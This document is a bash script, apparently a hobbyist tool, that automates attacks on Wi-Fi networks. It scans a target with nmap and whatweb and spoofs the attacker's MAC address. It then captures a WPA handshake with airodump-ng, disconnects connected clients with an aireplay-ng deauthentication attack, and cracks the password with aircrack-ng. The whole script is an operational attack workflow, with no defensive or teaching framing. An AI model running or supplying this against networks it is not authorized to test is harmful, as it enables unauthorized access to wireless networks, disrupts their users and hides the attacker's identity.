#!/bin/bash

clear
echo "Hello World....."
sleep 2
clear
echo "close the smaall pop-up window if it not asks you to install something"
echo "Tool Installer"
sleep 1
echo "if it cant install the tools you have to install it yourself"
sleep 2
xterm -hold -e ./install_tools.sh nmap  whatweb airmon-ng airodump-ng aircrack-ng wordlists
clear
echo "1). To use a to go to the main menu."
echo "2). To quit this program."

read  -p 'Enter your number... : ' choice
sleep 3
clear
if [ $choice == 1 ];
then
	echo "Entering main menu... "
	sleep 1
        echo -e " \033[0;34m Hacking a network executing..... "
	sleep 1
       	echo -e " \033[0;32m executing Hack using airmon-ng"
        sleep 1
        clear
	echo -e  " \033[0;31m chose a place where tou want to store the router info temorarilly"
	read temp
        echo -e "scanning for targets first, then a attack will Hack the \033[0;32m network "
        echo
        echo "this scanning attack will also display the http pots and nearby devices"
        sleep 2
        clear
	read -p 'Enter IP Address: ' ip
        if [ -z "$ip" ]
        then
     	   echo "Add IP Please"
        	exit 1
        fi
        printf "\033[0;31m \n----- NMAP -----\n\n" > $temp
        echo "Running Nmap..."
        nmap $ip | tail -n +5  >> $temp
        while read nmap
        do
        	if  [[ $nmap == *open* ]] && [[ $nmap == *http* ]] 
                then
                	echo "Running WhatWeb..."
                        whatweb $ip -v  > tem
                fi
                done < $temp

                if [ -e tem ]
                then
                	printf "\n----- Whatsweb -----\n\n" >> $temp
                        cat tem >> $temp
                        rm tem
                fi

                cat $temp

                echo "NERBY DEVICES ................................."
                read -p 'Enter Subnet ip': subnet
                if [ -z "$subnet" ]
                then
                	echo "add subnet please"
                        mainmenu
                fi

		echo "Your subnet ip is $subnet"
                echo    
                echo "running scan"
                nmap -sP $subnet
		echo "----------------------------------------------------------------------------------------------------------------------------"
                echo -e " \033[0;32m  Remember this was only for when for having a look over targets on the network and getting some info about router"
                echo "----------------------------------------------------------------------------------------------------------------------------"
	        sleep 4
                echo
                echo
                echo "if you have observed the open ports and targets etc ...press 1"
		read ans1111
                if [ $ans1111 ==  1 ];
                then
        
        	        clear
                        printf "\n----- NOW TIME TO Hack-------------------\n\n" 
                        echo
                        echo "putting interface in monitor"
                       	clear
                        echo "Tell me your interface"
                        read interface
                        clear
			airmon-ng start $interface
			sleep 1
			echo "-----------------------------------------------------------------------------------------------------------------"
                        echo -e "rember to put 'mon' along what to what your interface is..!!..For if your interface is wlan0, it will be \033[1;33m wlan0mon "
                        echo "----------------------------------------------------------------------------------------------------------------------==========---"

			echo "enter interface by adding mon at the end "
                        read mon
                        echo -e" \033[1;35m Spoofing your mac"
			ifconfig $mon down
			macchanger  -r  $mon
                        ifconfig $mon up
                        sleep 1 
                        echo "Changing the MAC Address"
                        sleep 2
                        clear
                        echo "If you want to airodump press 1 "
                        read airodumpoption
                        if  [ $airodumpoption -eq '1' ];
			then

                            	echo "executing airodump"
                                sleep 1
                                clear
                                echo
                                sleep 1
                                echo "when airodump window appears drag the mouse and select the area of the target's wifi info"
                                echo "press enter to 1"
                                read ans22
                                if [ $ans22 == '1' ];
                                then
                             		sleep 3
                                        clear
					echo "enter the path and file name where you want to store your images for screenshot"
					echo "for eg /path/name"
					read path
                                        mkdir $path
                                        cd $path
                                        echo "making directory and entering"
                                        sleep 1
                                        echo "dont close the window of airodump untill you capture network info area by dragging "
                                        echo "remember to ctrll+c the main window not pop up"
					echo "----------------------------------------------"
					sleep 3
                                        import image.png &
                                        sleep 3 &&
					airodump-ng $mon &&
                                        clear  
                                        sleep 1
					feh image.png 
					echo "Enter the BSSID"   
                                        read bssid 
					
                                        sleep 1 
                                        clear
					echo "now lets capture handshake"
                                        echo "enter the channel no"
                                        read channel
                                        echo " bssid = $bssid"
                                        echo "channel = $channel"
                                        sleep 3
                                        echo "enter destination file + name to write out"
                                        read desti
                                        sudo airodump-ng --bssid $bssid -c $channel -w $desti $mon &
                                        sleep 8 &&
                                        xterm -hold -e " aireplay-ng -0 10 -a $bssid $mon  "
                                        clear
                                        echo "now lets Hack password"
                                        clear
                                        echo "enter the destination (the destination you enetered earlier) of the cap file + 0.1.cap"
                                        echo
                                        echo "put .cap while putting the destination + name"
                                        echo "for eg /path/name-0.1.cap"
                                        sleep 3

                                        read capfile
                                        read -p 'Enter path of wordlist' wordlist
                                        aircrack-ng -w  $wordlist $capfile
					echo "restoring down to the previous "
					echo "stopping to spoof your identity"
                                        ifconfig $mon down
                                        macchanger -p $mon
                                        ifconfig $mon up

					echo "going back to managed mode"
					sleep 1
					airmon-ng stop $mon
					sleep 2
					clear
					echo "hope you enjoyed thank you"

		fi
			fi
				fi
					




else 
if [ $choice == 2 ];
then					
	echo "exitting"
        clear
        echo "bye" 
        sleep 2
fi

fi






